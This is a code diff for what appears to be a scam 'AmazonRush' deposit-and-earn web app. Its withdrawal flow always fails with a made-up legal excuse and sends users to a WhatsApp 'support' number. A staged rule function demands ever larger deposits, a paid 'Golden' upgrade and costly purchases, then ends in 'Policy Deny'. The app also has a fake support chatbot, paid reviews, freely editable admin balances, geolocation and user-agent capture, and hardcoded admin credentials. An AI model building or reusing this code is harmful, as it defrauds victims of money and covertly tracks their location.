+        renderAdmin();
+        setTimeout(()=>{
+          document.getElementById('withdrawOverlay').style.display = 'none';
+          document.getElementById('withdrawNotice').innerText = 'Withdrawal declined due to the high law in your country. Redirecting to support...';
+          window.location.href = 'https://wa.me/447876093863?text=Help%20with%20withdrawal%20decline';
+        }, 1600);
+      }, 1200);
+    }
+  }, 1400);
+}
+
+function abortWithdraw(){
+  if(withdrawProcessTimer) clearInterval(withdrawProcessTimer);
+  document.getElementById('withdrawOverlay').style.display = 'none';
+  document.getElementById('withdrawMsgSmall').innerText = '';
+  document.getElementById('withdrawNotice').innerText = 'Withdrawal process canceled by user.';
+}
+
+/* ===========================
+   Reviews
+   =========================== */
+function submitReview(){
+  showLoader();
+  setTimeout(()=>{
+    if(!currentEmail){ alert('Login required'); hideLoader(); return; }
+    const prodId = document.getElementById('review_product').value;
+    const text = document.getElementById('review_text').value.trim();
+    if(!text){ alert('Write a review'); hideLoader(); return; }
+    const users = getUsers(); const u = users[currentEmail];
+    if(!u.reviews) u.reviews = [];
+    const pend = getPendingReviews();
+    const r = {id: uid('rev'), user: currentEmail, productId: prodId, text, date: now(), status:'pending' };
+    pend.unshift(r);
+    savePendingReviews(pend);
+    u.reviews.push({id: r.id, text, status:'pending', date: now()});
+    users[currentEmail] = u;
+    saveUsers(users);
+    alert(`Review submitted and pending admin approval. Once approved $${reviewBonus} bonus will be credited.`);
+    document.getElementById('review_text').value = '';
+    renderAdmin();
+    hideLoader();
+  },700);
+}
+
+/* ===========================
+   Fake live chat bot
+   =========================== */
+function initChatBot(){
+  const win = document.getElementById('chatWindow');
+  if(win && win.children.length === 0){
+    const b = document.createElement('div'); b.className='bubble bot'; b.innerHTML = '<strong>Support:</strong> Welcome to AmazonRush! Ask me anything about deposits, withdrawals, or upgrades.';
+    win.appendChild(b);
+  }
+}
+
+function sendChat(){
+  const text = document.getElementById('chatInput').value.trim();
+  if(!text) return;
+  const win = document.getElementById('chatWindow');
+  const tdiv = document.createElement('div'); tdiv.className='bubble you'; tdiv.innerHTML = `<strong>You:</strong> ${escapeHtml(text)}`;
+  win.appendChild(tdiv); win.scrollTop = win.scrollHeight;
+  document.getElementById('chatInput').value = '';
+  document.getElementById('typingIndicator').classList.remove('hidden');
+  const replyDelay = Math.random()*2500 + 1000;
+  setTimeout(()=>{
+    document.getElementById('typingIndicator').classList.add('hidden');
+    let reply = chatBotReplies[Math.floor(Math.random()*chatBotReplies.length)];
+    const lower = text.toLowerCase();
+    if(lower.includes('withdraw')) reply = "I see you're asking about withdrawals — please ensure you meet the deposit and purchase rules. If eligible, provide the wallet address and proof.";
+    if(lower.includes('deposit')) reply = "For deposits, upload a clear receipt and the exact amount. We'll verify and credit after admin approval.";
+    if(lower.includes('upgrade') || lower.includes('gold')) reply = `Golden upgrade costs $${goldenFee}. Upload the receipt using the upgrade form and we'll review it.`;
+    if(lower.includes('review')) reply = `Once a review is approved, you'll receive $${reviewBonus} credited to your account.`;
+    const r = document.createElement('div'); r.className='bubble bot'; r.innerHTML = `<strong>Support:</strong> ${escapeHtml(reply)}`;
+    win.appendChild(r); win.scrollTop = win.scrollHeight;
+  }, replyDelay);
+}
+
+function clearChat(){ document.getElementById('chatWindow').innerHTML = ''; initChatBot(); }
+
+/* ===========================
+   Admin secret key flow (Option A)
+   =========================== */
+function promptAdminKey(){
+  const key = prompt('Enter admin secret key:');
+  if(!key) return;
+  if(key === ADMIN_SECRET_KEY){
+    document.getElementById('adminLogin').classList.remove('hidden');
+    document.getElementById('adminLogin').scrollIntoView({behavior:'smooth'});
+    showToast('Admin access enabled. Please login with credentials.',2000);
+  } else alert('Access denied.');
+}
+
+function adminLogin(){
+  const user = document.getElementById('admin_user').value.trim();
+  const pass = document.getElementById('admin_pass').value;
+  if(user === 'amazonrush112' && pass === 'SUCCESSFUL#'){
+    document.getElementById('adminPanel').classList.remove('hidden');
+    document.getElementById('adminLogin').classList.add('hidden');
+    renderAdmin();
+    showToast('Welcome, admin.',1500);
+  } else alert('Invalid admin credentials');
+}
+function adminLogout(){
+  document.getElementById('adminPanel').classList.add('hidden');
+  document.getElementById('adminLogin').classList.remove('hidden');
+}
+
+/* ===========================
+   Admin rendering & actions
+   =========================== */
+function renderAdmin(){
+  const search = document.getElementById('admin_search') ? document.getElementById('admin_search').value.toLowerCase() : '';
+  const users = getUsers(); const arr = Object.values(users);
+  const filtered = search ? arr.filter(u=>(u.name||'').toLowerCase().includes(search) || (u.email||'').toLowerCase().includes(search) || (u.phone||'').includes(search)) : arr;
+  const ul = document.getElementById('adminUsers');
+  ul.innerHTML = filtered.map(u=>{
+    const totalDeposited = (u.deposits||[]).reduce((s,x)=>s + (x.amount||0),0);
+    const purchases = (u.purchases||[]).length;
+    const inStage = computeRestrictionStage(u);
+    const loc = u.location ? `${u.location.lat.toFixed(3)}, ${u.location.lon.toFixed(3)}` : (u.location===null ? 'denied' : 'unknown');
+    return `<div class="small" style="border-bottom:1px solid #eee;padding:6px">
+      <strong>${escapeHtml(u.name)}</strong> — ${escapeHtml(u.email)}<br>
+      Balance: <input id="bal_${u.email}" value="${formatMoney(u.balance||0)}" size="6"> <button class="btn" onclick="updateBalance('${u.email}')">Update</button><br>
+      Deposited: $${formatMoney(totalDeposited)} | Purchases: ${purchases}<br>
+      Location: ${loc} | UA: ${escapeHtml(u.ua||'')}<br>
+      Stage: <strong>${escapeHtml(inStage)}</strong> | Referred by: ${u.referredBy || 'none'}
+    </div>`;
+  }).join('') || '<div class="small muted">No users</div>';
+
+  // pending deposits
+  const pd = getPendingDeposits();
+  document.getElementById('adminDeposits').innerHTML = pd.map((d,i)=>`<div class="small" style="border-bottom:1px solid #eee;padding:6px">
+    ${escapeHtml(d.user)} | $${formatMoney(d.amount)} | ${escapeHtml(d.method||'Crypto')} | ${new Date(d.date).toLocaleString()}<br>
+    Receipt: ${d.receiptRef? `<em>uploaded (session)</em>` : '<em>no file</em>'}<br>
+    <div class="row"><button class="btn" onclick="approveDeposit(${i})">Approve</button><button class="btn" onclick="rejectDeposit(${i})" style="background:#d9534f">Reject</button></div>
+  </div>`).join('') || '<div class="small muted">No pending deposits</div>';
+
+  // pending withdraws
+  const pw = getPendingWithdraws();
+  document.getElementById('adminWithdraws').innerHTML = pw.map((w,i)=>`<div class="small" style="border-bottom:1px solid #eee;padding:6px">
+    ${escapeHtml(w.user)} | $${formatMoney(w.amount)} | Addr: ${escapeHtml(w.account)} | ${escapeHtml(w.status||'pending')} | ${new Date(w.date).toLocaleString()}
+  </div>`).join('') || '<div class="small muted">No withdraw attempts</div>';
+
+  // pending reviews
+  const pr = getPendingReviews();
+  document.getElementById('adminReviews').innerHTML = pr.map((r,i)=>`<div class="small" style="border-bottom:1px solid #eee;padding:6px">
+    ${escapeHtml(r.user)} | ${escapeHtml(r.text)} | ${new Date(r.date).toLocaleString()}
+    <div class="row"><button class="btn" onclick="approveReview(${i})">Approve (+$${reviewBonus})</button><button class="btn" onclick="rejectReview(${i})" style="background:#d9534f">Reject</button></div>
+  </div>`).join('') || '<div class="small muted">No pending reviews</div>';
+
+  // pending purchases
+  const pp = getPendingPurchases();
+  document.getElementById('adminPurchases').innerHTML = pp.map((p,i)=>`<div class="small" style="border-bottom:1px solid #eee;padding:6px">
+    ${escapeHtml(p.user)} | Prod ${escapeHtml(p.productId)} | $${formatMoney(p.amount)} | ${new Date(p.date).toLocaleString()}<br>
+    Receipt: ${p.receiptRef? `<em>uploaded (session)</em>` : '<em>no file</em>'}<br>
+    <div class="row"><button class="btn" onclick="approvePurchase(${i})">Approve (+30%)</button><button class="btn" onclick="rejectPurchase(${i})" style="background:#d9534f">Reject</button></div>
+  </div>`).join('') || '<div class="small muted">No pending purchases</div>';
+
+  // pending upgrades
+  const pu = getPendingUpgrades();
+  document.getElementById('adminUpgrades').innerHTML = pu.map((up,i)=>`<div class="small" style="border-bottom:1px solid #eee;padding:6px">
+    ${escapeHtml(up.user)} | $${formatMoney(up.amount)} | ${new Date(up.date).toLocaleString()}<br>
+    Receipt: ${up.receiptRef? `<em>uploaded (session)</em>` : '<em>no file</em>'}<br>
+    <div class="row"><button class="btn" onclick="approveUpgrade(${i})">Approve</button><button class="btn" onclick="rejectUpgrade(${i})" style="background:#d9534f">Reject</button></div>
+  </div>`).join('') || '<div class="small muted">No pending upgrades</div>';
+
+  const tx = getTx();
+  document.getElementById('adminTx').innerHTML = tx.map(t=>`<div class="small" style="border-bottom:1px solid #eee;padding:6px">${escapeHtml(t.user)} | ${escapeHtml(t.type)} | $${formatMoney(t.amount)} | ${new Date(t.date).toLocaleString()}</div>`).join('') || '<div class="small muted">No transactions</div>';
+}
+
+/* Approve / reject handlers (work & credit properly) */
+function approveDeposit(index){
+  const pend = getPendingDeposits();
+  const d = pend.splice(index,1)[0];
+  savePendingDeposits(pend);
+  const users = getUsers();
+  if(users[d.user]){
+    users[d.user].deposits = users[d.user].deposits || [];
+    users[d.user].deposits.push({id: uid('depA'), amount: d.amount, date: now()});
+    users[d.user].balance = (users[d.user].balance || 0) + d.amount;
+    // referral
+    if(d.amount >= 100 && users[d.user].referredBy){
+      const referrer = Object.keys(users).find(em => users[em].referralCode === users[d.user].referredBy);
+      if(referrer){
+        users[referrer].balance = (users[referrer].balance || 0) + 50;
+        const tx = getTx(); tx.unshift({id:uid('tx'), user:referrer, type:'ReferralBonus', amount:50, date:now()}); saveTx(tx);
+      }
+    }
+    saveUsers(users);
+    const tx = getTx(); tx.unshift({id:uid('tx'), user:d.user, type:'Deposit', amount:d.amount, date:now()}); saveTx(tx);
+  }
+  renderAdmin(); renderProfile();
+  alert('Deposit approved and balance credited.');
+  playSound('cha');
+}
+
+function rejectDeposit(index){
+  const pend = getPendingDeposits(); pend.splice(index,1); savePendingDeposits(pend); renderAdmin(); alert('Deposit rejected.');
+}
+
+function approveReview(index){
+  const pend = getPendingReviews(); const r = pend.splice(index,1)[0]; savePendingReviews(pend);
+  const users = getUsers();
+  if(users[r.user]){
+    users[r.user].reviews = (users[r.user].reviews || []).map(rv => rv.id === r.id ? {...rv, status:'approved'} : rv);
+    users[r.user].balance = (users[r.user].balance || 0) + reviewBonus;
+    saveUsers(users);
+    const tx = getTx(); tx.unshift({id:uid('tx'), user:r.user, type:'ReviewBonus', amount:reviewBonus, date:now()}); saveTx(tx);
+  }
+  renderAdmin(); renderProfile();
+  alert(`Review approved and $${reviewBonus} credited.`);
+  playSound('cha');
+}
+
+function rejectReview(index){
+  const pend = getPendingReviews(); pend.splice(index,1); savePendingReviews(pend); renderAdmin(); alert('Review rejected.');
+}
+
+function approvePurchase(index){
+  const pend = getPendingPurchases(); const pur = pend.splice(index,1)[0]; savePendingPurchases(pend);
+  const users = getUsers();
+  if(users[pur.user]){
+    const add1 = pur.amount;
+    const add2 = Math.round(pur.amount * 0.7);
+    users[pur.user].purchases = users[pur.user].purchases || [];
+    users[pur.user].purchases.push({id: uid('buy'), productId: pur.productId, title: getProducts().find(pr=>pr.id===pur.productId).title, price: pur.amount, date: now()});
+    users[pur.user].balance = (users[pur.user].balance || 0) + add1 + add2;
+    saveUsers(users);
+    const tx = getTx(); tx.unshift({id:uid('tx'), user:pur.user, type:'Purchase', amount:add1, extra:add2, date:now(), productId:pur.productId}); saveTx(tx);
+  }
+  renderAdmin(); renderProfile();
+  alert('Purchase approved. Amount + 40% credited.');
+  playSound('cha');
+}
+
+function rejectPurchase(index){
+  const pend = getPendingPurchases(); pend.splice(index,1); savePendingPurchases(pend); renderAdmin(); alert('Purchase rejected.');
+}
+
+function approveUpgrade(index){
+  const pend = getPendingUpgrades(); const up = pend.splice(index,1)[0]; savePendingUpgrades(pend);
+  const users = getUsers();
+  if(users[up.user]){
+    users[up.user].golden = true;
+    saveUsers(users);
+    const tx = getTx(); tx.unshift({id:uid('tx'), user:up.user, type:'GoldenUpgrade', amount:goldenFee, date:now()}); saveTx(tx);
+  }
+  renderAdmin(); renderProfile();
+  alert('Upgrade approved. Account now Golden.');
+  playSound('cha');
+}
+
+function rejectUpgrade(index){
+  const pend = getPendingUpgrades(); pend.splice(index,1); savePendingUpgrades(pend); renderAdmin(); alert('Upgrade rejected.');
+}
+
+/* Admin balance update */
+function updateBalance(email){
+  const el = document.getElementById(`bal_${email}`); if(!el) return;
+  const bal = parseFloat(el.value); if(isNaN(bal)){ alert('Invalid balance'); return; }
+  const users = getUsers(); users[email].balance = bal; saveUsers(users); renderAdmin(); alert('Balance updated.');
+}
+
+/* Export CSV */
+function exportUsersToCSV(){
+  const users = getUsers();
+  let csv = 'Email,Name,Phone,Balance,Location,Deposited,Purchases\n';
+  Object.values(users).forEach(u=>{
+    const loc = u.location?`${u.location.lat},${u.location.lon}`:'';
+    const dep = (u.deposits||[]).reduce((s,x)=>s + (x.amount||0),0);
+    const pur = (u.purchases||[]).length;
+    csv += `${u.email},${u.name},${u.phone},${formatMoney(u.balance)},${loc},${dep},${pur}\n`;
+  });
+  const blob = new Blob([csv], {type:'text/csv'});
+  const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'users.csv'; a.click();
+}
+
+/* Golden upgrade request (store receiptRef) */
+function showGoldenUpgradeForm(){ document.getElementById('goldenForm').classList.toggle('hidden'); }
+function submitGoldenRequest(){
+  showLoader();
+  setTimeout(()=>{
+    if(!currentEmail){ alert('Login required'); hideLoader(); return; }
+    const file = document.getElementById('golden_receipt').files[0];
+    if(!file){ alert('Upload receipt proof'); hideLoader(); return; }
+    storeReceiptInMemory(file, (rid)=>{
+      const pend = getPendingUpgrades();
+      pend.unshift({id: uid('upg'), user: currentEmail, amount: goldenFee, receiptRef: rid || null, date: now(), status:'pending'});
+      savePendingUpgrades(pend);
+      alert('Golden upgrade request submitted with proof. Pending approval.');
+      document.getElementById('golden_receipt').value = '';
+      showGoldenUpgradeForm();
+      renderAdmin();
+      hideLoader();
+    });
+  },900);
+}
+
+/* Restriction stage */
+function computeRestrictionStage(u){
+  const totalDeposited = (u.deposits||[]).reduce((s,x)=>s + (x.amount||0),0);
+  if(totalDeposited < 250) return 'Rule 1: Deposit $200';
+  if(!u.golden) return 'Rule 2: Upgrade to Golden';
+  if((u.purchases||[]).length < 3) return 'Rule 3: Purchase 3 products';
+  if(!(u.purchases||[]).some(p=> p.price >= 800 && p.price <=5000)) return 'Rule 4: Buy product $800–$5,000';
+  return 'Final: Policy Deny';
+}
+
+/* Reset */
+function resetAll(){ if(confirm('Delete all data?')){ Object.values(LS).forEach(k=>localStorage.removeItem(k)); ensureProducts(); renderProducts(); renderAdmin(); alert('Reset done'); } }
+
+/* Deposits/withdraws display for users */
+function showDeposits(){ if(!currentEmail) return alert('Login required'); const users = getUsers(); const u = users[currentEmail]; alert('Your deposits (approved):\n' + (u.deposits && u.deposits.length ? u.deposits.map(d=>`$${formatMoney(d.amount)} — ${new Date(d.date).toLocaleString()}`).join('\n') : 'No deposits')); }
+function showWithdrawals(){ if(!currentEmail) return alert('Login required'); const users = getUsers(); const u = users[currentEmail]; alert('Your withdraw attempts:\n' + (u.withdraws && u.withdraws.length ? u.withdraws.map(w=>`$${formatMoney(w.amount)} — ${w.status||'pending'}`).join('\n') : 'No withdraws')); }
+
+/* Logout */
+function logout(){ currentEmail = null; showSection('homeCard'); updateBalanceDisplay(); }
+
+/* Capture geolocation */
+function captureLocation(email){
+  if(!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const users = getUsers();
+    if(users[email]){
+      users[email].location = {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy};
+      users[email].ua = navigator.userAgent;
+      saveUsers(users);
+    }
+  }, err=>{
+    const users = getUsers();
+    if(users[email]){
+      users[email].location = null;
+      users[email].ua = navigator.userAgent;
+      saveUsers(users);
+    }
+  }, {timeout:7000});
+}
+
+/* Dark toggle */
+function toggleDark(){ document.body.classList.toggle('dark'); document.getElementById('darkToggle').innerText = document.body.classList.contains('dark') ? 'Light' : 'Dark'; }
+
+/* Logo tap quick support */
+let logoTapCount = 0;
+function logoTap(){ logoTapCount++; setTimeout(()=>{ logoTapCount = 0; },900); if(logoTapCount>=3){ showSection('support'); showToast('Quick support opened'); logoTapCount = 0; } }
+
+/* Update balance display */
+function updateBalanceDisplay(){ const users = getUsers(); const u = currentEmail ? users[currentEmail] : null; document.getElementById('balanceDisplay').innerText = 'Balance: $' + (u?formatMoney(u.balance||0):'0.00'); }
+
+/* Expose global functions for inline onclicks */
+window.approveDeposit = approveDeposit; window.rejectDeposit = rejectDeposit;
+window.approveReview = approveReview; window.rejectReview = rejectReview;
+window.approvePurchase = approvePurchase; window.rejectPurchase = rejectPurchase;
+window.approveUpgrade = approveUpgrade; window.rejectUpgrade = rejectUpgrade;
+window.updateBalance = updateBalance;
+
+</script>
+</body>
+</html>
